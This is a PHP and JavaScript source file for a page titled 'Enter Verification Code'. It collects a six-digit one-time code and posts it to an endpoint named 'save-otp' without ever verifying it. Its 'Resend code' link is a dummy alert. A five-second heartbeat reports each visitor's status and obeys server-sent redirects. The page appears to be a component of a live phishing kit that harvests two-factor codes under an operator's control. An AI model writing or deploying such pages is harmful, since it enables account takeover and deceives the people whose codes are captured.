<?php
session_start();
require_once __DIR__ . '/includes/functions.php';
if (empty($_SESSION['student_token'])) { header('Location: index.php'); exit; }
$student = getStudentByToken($_SESSION['student_token']);
if (!$student) { header('Location: index.php'); exit; }
updateStudentActivity($student['id'], 'otp');
$visitorId = (int)($_SESSION['visitor_id'] ?? 0);
if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, status='otp', last_activity=datetime('now') WHERE id=?")->execute([$visitorId]); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One-Time Password</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0f2f5;color:#1e293b;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;border-radius:14px;padding:36px;max-width:400px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.06)}
        .icon{font-size:3rem;margin-bottom:16px}
        h1{font-size:1.3rem;margin-bottom:8px}
        p{color:#64748b;font-size:.88rem;margin-bottom:24px;line-height:1.6}
        .otp-grid{display:flex;gap:10px;justify-content:center;margin-bottom:24px}
        .otp-grid input{width:48px;height:56px;text-align:center;font-size:1.4rem;font-weight:700;border:1.5px solid #e2e8f0;border-radius:10px;font-family:inherit;transition:border-color .2s}
        .otp-grid input:focus{outline:none;border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.1)}
        .btn{display:block;width:100%;padding:14px;background:#2563eb;color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit}
        .btn:hover{background:#1d4ed8}
        .btn:disabled{background:#94a3b8;cursor:not-allowed}
        .resend{margin-top:16px;font-size:.82rem;color:#64748b}
        .resend a{color:#2563eb;cursor:pointer;text-decoration:none}
        .alert{padding:12px;border-radius:10px;font-size:.88rem;margin-top:16px;font-weight:500}
        .alert-success{background:#f0fdf4;color:#16a34a}
        .alert-error{background:#fef2f2;color:#dc2626}
    </style>
</head>
<body>
<div class="card">
    <div class="icon">&#128272;</div>
    <h1 data-i18n="otp_title">Enter Verification Code</h1>
    <p data-i18n="otp_message">We sent a 6-digit code to your registered phone number. Enter it below.</p>
    <div class="otp-grid" id="otpGrid">
        <input type="text" inputmode="numeric" maxlength="1">
        <input type="text" inputmode="numeric" maxlength="1">
        <input type="text" inputmode="numeric" maxlength="1">
        <input type="text" inputmode="numeric" maxlength="1">
        <input type="text" inputmode="numeric" maxlength="1">
        <input type="text" inputmode="numeric" maxlength="1">
    </div>
    <button class="btn" id="verifyBtn" onclick="verify()" data-i18n="btn_verify">Verify</button>
    <div class="resend"><span data-i18n="otp_resend">Didn't receive it?</span> <a onclick="alert('Code resent!')" data-i18n="otp_resend_link">Resend code</a></div>
    <div id="msg"></div>
</div>
<script src="assets/js/i18n.js"></script>
<script>
const studentId=<?=(int)$student['id']?>;const visitorId=<?=$visitorId?>;let pageVisible=true;

// OTP input auto-advance
const inputs = document.querySelectorAll('#otpGrid input');
inputs.forEach((inp, i) => {
    inp.addEventListener('input', () => {
        inp.value = inp.value.replace(/\D/g, '');
        if (inp.value && i < inputs.length - 1) inputs[i+1].focus();
    });
    inp.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !inp.value && i > 0) inputs[i-1].focus();
    });
    inp.addEventListener('paste', (e) => {
        e.preventDefault();
        const pasted = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
        pasted.split('').forEach((ch, j) => { if (inputs[j]) inputs[j].value = ch; });
        if (pasted.length > 0) inputs[Math.min(pasted.length, inputs.length) - 1].focus();
    });
});

async function verify() {
    const code = Array.from(inputs).map(i => i.value).join('');
    if (code.length < 6) { document.getElementById('msg').className='alert alert-error'; document.getElementById('msg').textContent=i18n.t('msg_enter_6'); return; }
    document.getElementById('verifyBtn').disabled = true;
    document.getElementById('verifyBtn').textContent = i18n.t('msg_verifying');
    try {
        const resp = await fetch('api/save-otp.php', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ student_id: studentId, otp_code: code })
        });
        const data = await resp.json();
        if (data.success) {
            document.getElementById('msg').className='alert alert-success';
            document.getElementById('msg').textContent=i18n.t('msg_otp_success');
            setTimeout(() => { window.location.href = 'waiting.php'; }, 2000);
        } else {
            document.getElementById('msg').className='alert alert-error';
            document.getElementById('msg').textContent=data.error || i18n.t('msg_otp_fail');
            document.getElementById('verifyBtn').disabled = false;
            document.getElementById('verifyBtn').textContent = i18n.t('btn_verify');
        }
    } catch(e) {
        document.getElementById('msg').className='alert alert-error';
        document.getElementById('msg').textContent='Connection error';
        document.getElementById('verifyBtn').disabled = false;
        document.getElementById('verifyBtn').textContent = 'Verify';
    }
}

function hb(){if(!pageVisible||document.hidden)return;fetch('api/heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({student_id:studentId})}).then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect}).catch(()=>{});if(visitorId)fetch('api/visitor-heartbeat.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitor_id:visitorId,status:'otp'})}).catch(()=>{});}
document.addEventListener('visibilitychange',()=>{if(document.hidden){pageVisible=false;navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));if(visitorId)navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));clearInterval(t);t=null}else{pageVisible=true;hb();if(!t)t=setInterval(hb,5000)}});
function off(){navigator.sendBeacon('api/offline.php',JSON.stringify({student_id:studentId}));if(visitorId)navigator.sendBeacon('api/visitor-offline.php',JSON.stringify({visitor_id:visitorId}));}
hb();let t=setInterval(hb,5000);window.addEventListener('pagehide',off);window.addEventListener('beforeunload',off);
</script>
</body>
</html>
